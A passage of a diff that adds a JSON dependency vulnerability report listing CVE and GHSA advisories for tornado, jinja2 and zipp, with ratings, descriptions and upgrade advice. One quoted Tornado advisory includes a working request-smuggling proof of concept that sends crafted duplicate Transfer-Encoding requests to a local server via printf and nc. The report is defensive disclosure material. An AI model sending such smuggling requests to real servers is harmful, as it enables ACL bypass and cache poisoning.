+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/tornado/PYSEC-2023-75.yaml"
+        },
+        {
+          "url": "https://github.com/tornadoweb/tornado"
+        },
+        {
+          "url": "https://github.com/tornadoweb/tornado/commit/32ad07c54e607839273b4e1819c347f5c8976b2f"
+        },
+        {
+          "url": "https://github.com/tornadoweb/tornado/releases/tag/v6.3.2"
+        },
+        {
+          "url": "https://jvn.jp/en/jp/JVN45127776"
+        },
+        {
+          "url": "https://jvn.jp/en/jp/JVN45127776/"
+        },
+        {
+          "url": "https://linux.oracle.com/cve/CVE-2023-28370.html"
+        },
+        {
+          "url": "https://linux.oracle.com/errata/ELSA-2023-6523.html"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28370"
+        },
+        {
+          "url": "https://ubuntu.com/security/notices/USN-6159-1"
+        },
+        {
+          "url": "https://ubuntu.com/security/notices/USN-7150-1"
+        },
+        {
+          "url": "https://www.cve.org/CVERecord?id=CVE-2023-28370"
+        }
+      ],
+      "published": "2023-05-25T10:15:09+00:00",
+      "updated": "2025-01-16T16:15:28+00:00",
+      "affects": [
+        {
+          "ref": "pkg:pypi/tornado@6.1",
+          "versions": [
+            {
+              "version": "6.1",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2024-22195",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "alma"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "amazon"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "azure"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "cbl-mariner"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "score": 5.4,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
+        },
+        {
+          "source": {
+            "name": "nvd"
+          },
+          "score": 6.1,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+        },
+        {
+          "source": {
+            "name": "oracle-oval"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "redhat"
+          },
+          "score": 5.4,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
+        },
+        {
+          "source": {
+            "name": "rocky"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "ubuntu"
+          },
+          "severity": "medium"
+        }
+      ],
+      "cwes": [
+        79
+      ],
+      "description": "Jinja is an extensible templating engine. Special placeholders in the template allow writing code similar to Python syntax. It is possible to inject arbitrary HTML attributes into the rendered HTML template, potentially leading to Cross-Site Scripting (XSS). The Jinja `xmlattr` filter can be abused to inject arbitrary HTML attribute keys and values, bypassing the auto escaping mechanism and potentially leading to XSS. It may also be possible to bypass attribute validation checks if they are blacklist-based.",
+      "recommendation": "Upgrade jinja2 to version 3.1.3",
+      "advisories": [
+        {
+          "url": "https://avd.aquasec.com/nvd/cve-2024-22195"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2024:3102"
+        },
+        {
+          "url": "https://access.redhat.com/security/cve/CVE-2024-22195"
+        },
+        {
+          "url": "https://bugzilla.redhat.com/2257854"
+        },
+        {
+          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2257854"
+        },
+        {
+          "url": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22195"
+        },
+        {
+          "url": "https://errata.almalinux.org/8/ALSA-2024-3102.html"
+        },
+        {
+          "url": "https://errata.rockylinux.org/RLSA-2024:3102"
+        },
+        {
+          "url": "https://github.com/pallets/jinja"
+        },
+        {
+          "url": "https://github.com/pallets/jinja/commit/716795349a41d4983a9a4771f7d883c96ea17be7"
+        },
+        {
+          "url": "https://github.com/pallets/jinja/releases/tag/3.1.3"
+        },
+        {
+          "url": "https://github.com/pallets/jinja/security/advisories/GHSA-h5c8-rqwp-cp95"
+        },
+        {
+          "url": "https://linux.oracle.com/cve/CVE-2024-22195.html"
+        },
+        {
+          "url": "https://linux.oracle.com/errata/ELSA-2024-3102.html"
+        },
+        {
+          "url": "https://lists.debian.org/debian-lts-announce/2024/01/msg00010.html"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5XCWZD464AJJJUBOO7CMPXQ4ROBC6JX2"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5XCWZD464AJJJUBOO7CMPXQ4ROBC6JX2/"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DELCVUUYX75I5K4Q5WMJG4MUZJA6VAIP"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DELCVUUYX75I5K4Q5WMJG4MUZJA6VAIP/"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/O7YWRBX6JQCWC2XXCTZ55C7DPMGICCN3"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/O7YWRBX6JQCWC2XXCTZ55C7DPMGICCN3/"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-22195"
+        },
+        {
+          "url": "https://ubuntu.com/security/notices/USN-6599-1"
+        },
+        {
+          "url": "https://www.cve.org/CVERecord?id=CVE-2024-22195"
+        }
+      ],
+      "published": "2024-01-11T03:15:11+00:00",
+      "updated": "2025-02-13T18:16:46+00:00",
+      "affects": [
+        {
+          "ref": "pkg:pypi/jinja2@3.0.3",
+          "versions": [
+            {
+              "version": "3.0.3",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2024-34064",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "alma"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "amazon"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "azure"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "cbl-mariner"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "score": 5.4,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
+        },
+        {
+          "source": {
+            "name": "oracle-oval"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "photon"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "redhat"
+          },
+          "score": 5.4,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
+        },
+        {
+          "source": {
+            "name": "rocky"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "ubuntu"
+          },
+          "severity": "medium"
+        }
+      ],
+      "cwes": [
+        79
+      ],
+      "description": "Jinja is an extensible templating engine. The `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `>`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for CVE-2024-22195 only addressed spaces but not other characters. Accepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe. This vulnerability is fixed in 3.1.4.",
+      "recommendation": "Upgrade jinja2 to version 3.1.4",
+      "advisories": [
+        {
+          "url": "https://avd.aquasec.com/nvd/cve-2024-34064"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2024:4231"
+        },
+        {
+          "url": "https://access.redhat.com/security/cve/CVE-2024-34064"
+        },
+        {
+          "url": "https://bugzilla.redhat.com/2279476"
+        },
+        {
+          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2279476"
+        },
+        {
+          "url": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-34064"
+        },
+        {
+          "url": "https://errata.almalinux.org/8/ALSA-2024-4231.html"
+        },
+        {
+          "url": "https://errata.rockylinux.org/RLSA-2024:3820"
+        },
+        {
+          "url": "https://github.com/pallets/jinja"
+        },
+        {
+          "url": "https://github.com/pallets/jinja/commit/0668239dc6b44ef38e7a6c9f91f312fd4ca581cb"
+        },
+        {
+          "url": "https://github.com/pallets/jinja/security/advisories/GHSA-h75v-3vvj-5mfj"
+        },
+        {
+          "url": "https://linux.oracle.com/cve/CVE-2024-34064.html"
+        },
+        {
+          "url": "https://linux.oracle.com/errata/ELSA-2024-9150.html"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/567XIGSZMABG6TSMYWD7MIYNJSUQQRUC"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/567XIGSZMABG6TSMYWD7MIYNJSUQQRUC/"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/GCLF44KY43BSVMTE6S53B4V5WP3FRRSE"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/GCLF44KY43BSVMTE6S53B4V5WP3FRRSE/"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SSCBHIL6BYKR5NRCBXP4XMP2CEEKGFVS"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SSCBHIL6BYKR5NRCBXP4XMP2CEEKGFVS/"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZALNWE3TXPPHVPSI3AZ5CTMSTAVN5UMS"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZALNWE3TXPPHVPSI3AZ5CTMSTAVN5UMS/"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-34064"
+        },
+        {
+          "url": "https://ubuntu.com/security/notices/USN-6787-1"
+        },
+        {
+          "url": "https://www.cve.org/CVERecord?id=CVE-2024-34064"
+        }
+      ],
+      "published": "2024-05-06T15:15:23+00:00",
+      "updated": "2025-02-04T17:15:18+00:00",
+      "affects": [
+        {
+          "ref": "pkg:pypi/jinja2@3.0.3",
+          "versions": [
+            {
+              "version": "3.0.3",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2024-52804",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "alma"
+          },
+          "severity": "high"
+        },
+        {
+          "source": {
+            "name": "amazon"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "score": 7.5,
+          "severity": "high",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "source": {
+            "name": "oracle-oval"
+          },
+          "severity": "high"
+        },
+        {
+          "source": {
+            "name": "photon"
+          },
+          "severity": "high"
+        },
+        {
+          "source": {
+            "name": "redhat"
+          },
+          "score": 7.5,
+          "severity": "high",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "source": {
+            "name": "ubuntu"
+          },
+          "severity": "medium"
+        }
+      ],
+      "cwes": [
+        400,
+        770
+      ],
+      "description": "Tornado is a Python web framework and asynchronous networking library. The algorithm used for parsing HTTP cookies in Tornado versions prior to 6.4.2 sometimes has quadratic complexity, leading to excessive CPU consumption when parsing maliciously-crafted cookie headers. This parsing occurs in the event loop thread and may block the processing of other requests. Version 6.4.2 fixes the issue.",
+      "recommendation": "Upgrade tornado to version 6.4.2",
+      "advisories": [
+        {
+          "url": "https://avd.aquasec.com/nvd/cve-2024-52804"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2024:10590"
+        },
+        {
+          "url": "https://access.redhat.com/security/cve/CVE-2024-52804"
+        },
+        {
+          "url": "https://bugzilla.redhat.com/2328045"
+        },
+        {
+          "url": "https://errata.almalinux.org/9/ALSA-2024-10590.html"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-7pwv-g7hj-39pr"
+        },
+        {
+          "url": "https://github.com/tornadoweb/tornado"
+        },
+        {
+          "url": "https://github.com/tornadoweb/tornado/commit/d5ba4a1695fbf7c6a3e54313262639b198291533"
+        },
+        {
+          "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-8w49-h785-mj3c"
+        },
+        {
+          "url": "https://linux.oracle.com/cve/CVE-2024-52804.html"
+        },
+        {
+          "url": "https://linux.oracle.com/errata/ELSA-2024-10590.html"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-52804"
+        },
+        {
+          "url": "https://ubuntu.com/security/notices/USN-7150-1"
+        },
+        {
+          "url": "https://www.cve.org/CVERecord?id=CVE-2024-52804"
+        }
+      ],
+      "published": "2024-11-22T16:15:34+00:00",
+      "updated": "2024-11-22T16:15:34+00:00",
+      "affects": [
+        {
+          "ref": "pkg:pypi/tornado@6.1",
+          "versions": [
+            {
+              "version": "6.1",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2024-5569",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "amazon"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "azure"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "score": 6.2,
+          "severity": "medium",
+          "method": "CVSSv3",
+          "vector": "CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "source": {
+            "name": "redhat"
+          },
+          "score": 6.2,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "source": {
+            "name": "ubuntu"
+          },
+          "severity": "medium"
+        }
+      ],
+      "cwes": [
+        400
+      ],
+      "description": "A Denial of Service (DoS) vulnerability exists in the jaraco/zipp library, affecting all versions prior to 3.19.1. The vulnerability is triggered when processing a specially crafted zip file that leads to an infinite loop. This issue also impacts the zipfile module of CPython, as features from the third-party zipp library are later merged into CPython, and the affected code is identical in both projects. The infinite loop can be initiated through the use of functions affecting the `Path` module in both zipp and zipfile, such as `joinpath`, the overloaded division operator, and `iterdir`. Although the infinite loop is not resource exhaustive, it prevents the application from responding. The vulnerability was addressed in version 3.19.1 of jaraco/zipp.",
+      "recommendation": "Upgrade zipp to version 3.19.1",
+      "advisories": [
+        {
+          "url": "https://avd.aquasec.com/nvd/cve-2024-5569"
+        },
+        {
+          "url": "https://access.redhat.com/security/cve/CVE-2024-5569"
+        },
+        {
+          "url": "https://github.com/jaraco/zipp"
+        },
+        {
+          "url": "https://github.com/jaraco/zipp/commit/fd604bd34f0343472521a36da1fbd22e793e14fd"
+        },
+        {
+          "url": "https://huntr.com/bounties/be898306-11f9-46b4-b28c-f4c4aa4ffbae"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-5569"
+        },
+        {
+          "url": "https://ubuntu.com/security/notices/USN-6906-1"
+        },
+        {
+          "url": "https://www.cve.org/CVERecord?id=CVE-2024-5569"
+        }
+      ],
+      "published": "2024-07-09T00:15:02+00:00",
+      "updated": "2024-11-21T09:47:56+00:00",
+      "affects": [
+        {
+          "ref": "pkg:pypi/zipp@3.6.0",
+          "versions": [
+            {
+              "version": "3.6.0",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2024-56201",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "alma"
+          },
+          "severity": "high"
+        },
+        {
+          "source": {
+            "name": "amazon"
+          },
+          "severity": "high"
+        },
+        {
+          "source": {
+            "name": "azure"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "cbl-mariner"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "score": 8.8,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+        },
+        {
+          "source": {
+            "name": "oracle-oval"
+          },
+          "severity": "high"
+        },
+        {
+          "source": {
+            "name": "redhat"
+          },
+          "score": 7.3,
+          "severity": "high",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H"
+        },
+        {
+          "source": {
+            "name": "ubuntu"
+          },
+          "severity": "medium"
+        }
+      ],
+      "cwes": [
+        150
+      ],
+      "description": "Jinja is an extensible templating engine. In versions on the 3.x branch prior to 3.1.5, a bug in the Jinja compiler allows an attacker that controls both the content and filename of a template to execute arbitrary Python code, regardless of if Jinja's sandbox is used. To exploit the vulnerability, an attacker needs to control both the filename and the contents of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates where the template author can also choose the template filename. This vulnerability is fixed in 3.1.5.",
+      "recommendation": "Upgrade jinja2 to version 3.1.5",
+      "advisories": [
+        {
+          "url": "https://avd.aquasec.com/nvd/cve-2024-56201"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2025:0308"
+        },
+        {
+          "url": "https://access.redhat.com/security/cve/CVE-2024-56201"
+        },
+        {
+          "url": "https://errata.almalinux.org/9/ALSA-2025-0308.html"
+        },
+        {
+          "url": "https://github.com/pallets/jinja"
+        },
+        {
+          "url": "https://github.com/pallets/jinja/commit/767b23617628419ae3709ccfb02f9602ae9fe51f"
+        },
+        {
+          "url": "https://github.com/pallets/jinja/issues/1792"
+        },
+        {
+          "url": "https://github.com/pallets/jinja/releases/tag/3.1.5"
+        },
+        {
+          "url": "https://github.com/pallets/jinja/security/advisories/GHSA-gmj6-6f8f-6699"
+        },
+        {
+          "url": "https://linux.oracle.com/cve/CVE-2024-56201.html"
+        },
+        {
+          "url": "https://linux.oracle.com/errata/ELSA-2025-0308.html"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-56201"
+        },
+        {
+          "url": "https://ubuntu.com/security/notices/USN-7244-1"
+        },
+        {
+          "url": "https://www.cve.org/CVERecord?id=CVE-2024-56201"
+        }
+      ],
+      "published": "2024-12-23T16:15:07+00:00",
+      "updated": "2025-02-18T22:15:12+00:00",
+      "affects": [
+        {
+          "ref": "pkg:pypi/jinja2@3.0.3",
+          "versions": [
+            {
+              "version": "3.0.3",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2024-56326",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "alma"
+          },
+          "severity": "high"
+        },
+        {
+          "source": {
+            "name": "amazon"
+          },
+          "severity": "high"
+        },
+        {
+          "source": {
+            "name": "azure"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "cbl-mariner"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "score": 7.8,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+        },
+        {
+          "source": {
+            "name": "oracle-oval"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "redhat"
+          },
+          "score": 6.3,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:H"
+        },
+        {
+          "source": {
+            "name": "rocky"
+          },
+          "severity": "high"
+        },
+        {
+          "source": {
+            "name": "ubuntu"
+          },
+          "severity": "medium"
+        }
+      ],
+      "cwes": [
+        693,
+        1336
+      ],
+      "description": "Jinja is an extensible templating engine. Prior to 3.1.5, An oversight in how the Jinja sandboxed environment detects calls to str.format allows an attacker that controls the content of a template to execute arbitrary Python code. To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates. Jinja's sandbox does catch calls to str.format and ensures they don't escape the sandbox. However, it's possible to store a reference to a malicious string's format method, then pass that to a filter that calls it. No such filters are built-in to Jinja, but could be present through custom filters in an application. After the fix, such indirect calls are also handled by the sandbox. This vulnerability is fixed in 3.1.5.",
+      "recommendation": "Upgrade jinja2 to version 3.1.5",
+      "advisories": [
+        {
+          "url": "https://avd.aquasec.com/nvd/cve-2024-56326"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2025:0711"
+        },
+        {
+          "url": "https://access.redhat.com/security/cve/CVE-2024-56326"
+        },
+        {
+          "url": "https://bugzilla.redhat.com/2333856"
+        },
+        {
+          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2333856"
+        },
+        {
+          "url": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-56326"
+        },
+        {
+          "url": "https://errata.almalinux.org/8/ALSA-2025-0711.html"
+        },
+        {
+          "url": "https://errata.rockylinux.org/RLSA-2025:0711"
+        },
+        {
+          "url": "https://github.com/pallets/jinja"
+        },
+        {
+          "url": "https://github.com/pallets/jinja/commit/48b0687e05a5466a91cd5812d604fa37ad0943b4"
+        },
+        {
+          "url": "https://github.com/pallets/jinja/releases/tag/3.1.5"
+        },
+        {
+          "url": "https://github.com/pallets/jinja/security/advisories/GHSA-q2x7-8rv6-6q7h"
+        },
+        {
+          "url": "https://linux.oracle.com/cve/CVE-2024-56326.html"
+        },
+        {
+          "url": "https://linux.oracle.com/errata/ELSA-2025-1250.html"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-56326"
+        },
+        {
+          "url": "https://ubuntu.com/security/notices/USN-7244-1"
+        },
+        {
+          "url": "https://www.cve.org/CVERecord?id=CVE-2024-56326"
+        }
+      ],
+      "published": "2024-12-23T16:15:07+00:00",
+      "updated": "2024-12-27T18:15:38+00:00",
+      "affects": [
+        {
+          "ref": "pkg:pypi/jinja2@3.0.3",
+          "versions": [
+            {
+              "version": "3.0.3",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2025-27516",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "severity": "medium"
+        },
+        {
+          "source": {
+            "name": "redhat"
+          },
+          "score": 7.3,
+          "severity": "high",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "cwes": [
+        1336
+      ],
+      "description": "Jinja is an extensible templating engine. Prior to 3.1.6, an oversight in how the Jinja sandboxed environment interacts with the |attr filter allows an attacker that controls the content of a template to execute arbitrary Python code. To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates. Jinja's sandbox does catch calls to str.format and ensures they don't escape the sandbox. However, it's possible to use the |attr filter to get a reference to a string's plain format method, bypassing the sandbox. After the fix, the |attr filter no longer bypasses the environment's attribute lookup. This vulnerability is fixed in 3.1.6.",
+      "recommendation": "Upgrade jinja2 to version 3.1.6",
+      "advisories": [
+        {
+          "url": "https://avd.aquasec.com/nvd/cve-2025-27516"
+        },
+        {
+          "url": "https://access.redhat.com/security/cve/CVE-2025-27516"
+        },
+        {
+          "url": "https://github.com/pallets/jinja"
+        },
+        {
+          "url": "https://github.com/pallets/jinja/commit/90457bbf33b8662926ae65cdde4c4c32e756e403"
+        },
+        {
+          "url": "https://github.com/pallets/jinja/security/advisories/GHSA-cpwx-vrp4-4pq7"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-27516"
+        },
+        {
+          "url": "https://www.cve.org/CVERecord?id=CVE-2025-27516"
+        }
+      ],
+      "published": "2025-03-05T21:15:20+00:00",
+      "updated": "2025-03-05T21:15:20+00:00",
+      "affects": [
+        {
+          "ref": "pkg:pypi/jinja2@3.0.3",
+          "versions": [
+            {
+              "version": "3.0.3",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "GHSA-753j-mpmx-qq6g",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "score": 5.3,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        }
+      ],
+      "description": "### Summary\nWhen Tornado receives a request with two `Transfer-Encoding: chunked` headers, it ignores them both. This enables request smuggling when Tornado is deployed behind a proxy server that emits such requests. [Pound](https://en.wikipedia.org/wiki/Pound_(networking)) does this.\n\n### PoC\n0. Install Tornado.\n1. Start a simple Tornado server that echoes each received request's body:\n```bash\ncat << EOF > server.py\nimport asyncio\nimport tornado\n\nclass MainHandler(tornado.web.RequestHandler):\n    def post(self):\n        self.write(self.request.body)\n\nasync def main():\n    tornado.web.Application([(r\"/\", MainHandler)]).listen(8000)\n    await asyncio.Event().wait()\n\nasyncio.run(main())\nEOF\npython3 server.py &\n```\n2. Send a valid chunked request:\n```bash\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n3. Observe that the response is as expected:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:32:05 GMT\nContent-Length: 1\n\nZ\n```\n4. Send a request with two `Transfer-Encoding: chunked` headers:\n```\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n5. Observe the strange response:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:35:40 GMT\nContent-Length: 0\n\nHTTP/1.1 400 Bad Request\n\n```\nThis is because Tornado believes that the request has no message body, so it tries to interpret `1\\r\\nZ\\r\\n0\\r\\n\\r\\n` as its own request, which causes a 400 response. With a little cleverness involving `chunk-ext`s, you can get Tornado to instead respond 405, which has the potential to desynchronize the connection, as opposed to 400 which should always result in a connection closure.\n\n### Impact\nAnyone using Tornado behind a proxy that forwards requests containing multiple `Transfer-Encoding: chunked` headers is vulnerable to request smuggling, which may entail ACL bypass, cache poisoning, or connection desynchronization.\n",
+      "recommendation": "Upgrade tornado to version 6.4.1",
+      "advisories": [
+        {
+          "url": "https://github.com/advisories/GHSA-753j-mpmx-qq6g"
+        },
+        {
+          "url": "https://github.com/tornadoweb/tornado"
+        },
+        {
+          "url": "https://github.com/tornadoweb/tornado/commit/d65f6e71a77f53a1ff0a0dc55704be13f04eb572"
+        },
+        {
+          "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-753j-mpmx-qq6g"
+        }
+      ],
+      "affects": [
+        {
+          "ref": "pkg:pypi/tornado@6.1",
+          "versions": [
+            {
+              "version": "6.1",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "GHSA-qppv-j76h-2rpx",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "severity": "medium"
+        }
+      ],
+      "description": "## Summary\nTornado interprets `-`, `+`, and `_` in chunk length and `Content-Length` values, which are not allowed by the HTTP RFCs. This can result in request smuggling when Tornado is deployed behind certain proxies that interpret those non-standard characters differently. This is known to apply to older versions of haproxy, although the current release is not affected.\n\n## Details\nTornado uses the `int` constructor to parse the values of `Content-Length` headers and chunk lengths in the following locations:\n### `tornado/http1connection.py:445`\n```python3\n            self._expected_content_remaining = int(headers[\"Content-Length\"])\n```\n### `tornado/http1connection.py:621`\n```python3\n                content_length = int(headers[\"Content-Length\"])  # type: Optional[int]\n```\n### `tornado/http1connection.py:671`\n```python3\n            chunk_len = int(chunk_len_str.strip(), 16)\n```\nBecause `int(\"0_0\") == int(\"+0\") == int(\"-0\") == int(\"0\")`, using the `int` constructor to parse and validate strings that should contain only ASCII digits is not a good 